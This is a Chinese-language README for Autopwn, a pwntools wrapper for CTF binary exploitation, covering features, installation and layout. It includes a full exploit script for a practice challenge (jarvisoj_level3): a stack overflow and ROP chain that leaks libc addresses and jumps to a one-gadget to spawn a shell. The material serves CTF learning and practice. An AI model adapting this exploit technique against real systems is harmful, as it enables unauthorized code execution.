# Autopwn

## 简介

Autopwn项目，致力于提供如下特性：

- 简化exp
- 对pwntools常用功能的更好的包装

目前已经实现的功能：
- 对自定义函数的包装（不完善）
- 使用命令行参数启动脚本，从而实现不同的功能（local run，local debug，remote run）
- 允许用户自定义debug时的gdb脚本，添加了对PIE程序仅使用偏移下断点的支持
- 允许用户自行提供函数封装，并将其添加为tubes的方法，已内置数个别名
- 允许用户更改elf文件的库查找路径与解释器路径（使用patchelf实现）
- 允许用户为当前的elf生成一个可修改的lief Binary对象
- 添加Ubuntu常用库的数据库（ld，libc，libdl）

## 效果图

- 自动生成配置文件


- 搭配emacs的YASnippet插件一键生成exp框架


- 一键patchelf

- 自带常用tube方法别名（如rl，sl，ru），一键运行

- 无视PIE，自定义断点，一键调试

- 一键远程连接


## 安装

### 依赖
- python 2.7 (environment)
- pwntools (module)
- pandas (module)
- lief (module)
- patchelf (application)

### 安装方法

1. `git clone https://github.com/CTSinon/Autopwn.git`
   
2. 将这一行添加到.bashrc中：
`alias gen='python path/to/gen.py`

3. 将autopwn文件夹添加到python的path中

4. 将LIBC文件夹中的ubuntu库放到你喜欢的位置

5. enjoy it!

## 其他

### 栗子🌰

题目链接：https://buuoj.cn/challenges#jarvisoj_level3

```python
from pwn import *
from autopwn.core import pwn
from sys import argv

def leak(self, a):
    pass


# 该函数将会被动态添加到内置的一个类中
# 你可以自由的使用类属性（如当前elf对象）
# 代价仅仅是在参数中添加一个self
def exp(self, a):
    read_got = self.elf.got['read']
    # 这里elf对象是类属性
    write_got = self.elf.got['write']
    write_plt = self.elf.plt['write']
    read_plt = self.elf.plt['read']
    esp_c = 0x080482ee
    read_offset = self.lib[0].symbols['read']
    # lib同样是类属性，是一个存放下面指定的lib对应的elf对象的数组
    one_offset = 0x3a80c

    a.rl()
    # 这是recvline的别名，你可以在less_tube.py中定义你自己的别名
    payload = 'a' * 0x88
    payload += 'a' * 4
    payload += p32(write_plt) + p32(esp_c)
    payload += p32(1) + p32(read_got) + p32(4)
    payload += p32(read_plt) + p32(write_plt)
    payload += p32(0) + p32(write_got) + p32(4)

    a.sl(payload)

    read_addr = unpack(a.recvn(4), 'all')
    a.lg("Got read addr: ", read_addr)
    one_addr = read_addr + one_offset - read_offset

    a.send(p32(one_addr))
    
# 该函数用于getshell之后获取flag
# 一般的题目这样就好
def get_flag(self, a):
    a.interactive()
    return

pwn.ctf(argv, exp, get_flag,
        bp=0x080484a6,
        # 指定断点，开启PIE时使用偏移就好
        inter='../libc6-i386_2.23-0ubuntu10_amd64/ld-2.23.so',
        # 如果你要patch libc的话，一定要指定相应的ld
        needed=['../libc6-i386_2.23-0ubuntu10_amd64/libc-2.23.so'])
        # needed是一个数组，你可以使用它来替换dynamic段中所用needed项（包括大部分动态链接库）
```

### 目录结构

```
.
├── \
├── autopwn
│   ├── awd                       # awd框架，未实现
│   │   ├── attacker.py           # =-=
│   │   ├── attack.py             # =-=
│   │   ├── get_ip.py             # 获取目标列表
│   │   └── __init__.py
│   ├── core
│   │   ├── classes.py            # 存放核心类
│   │   ├── __init__.py
│   │   └── pwn.py                # 主文件
│   ├── ctf
│   │   ├── attack.py             # 主文件
│   │   ├── __init__.py
│   │   ├── less_tube.py          # 为tube类添加更多特性
│   │   └── stack.py              # 栈布局可视化（已废弃）
│   └── __init__.py
├── autopwn.conf                  # 配置文件模版
├── gen.py                        # 生成配置文件
├── README.md
└── test
    ├── flag
    └── payload.py
```

### 碎碎念

作者没有专业研究过python这门语言，所以脚本写得一眼难尽。设计模式之类的更是没怎么研究过。希望各路大神能提出更好的建议，添加更方便的功能，大家一起进步呀 (๑•̀ㅂ•́)و✧ 
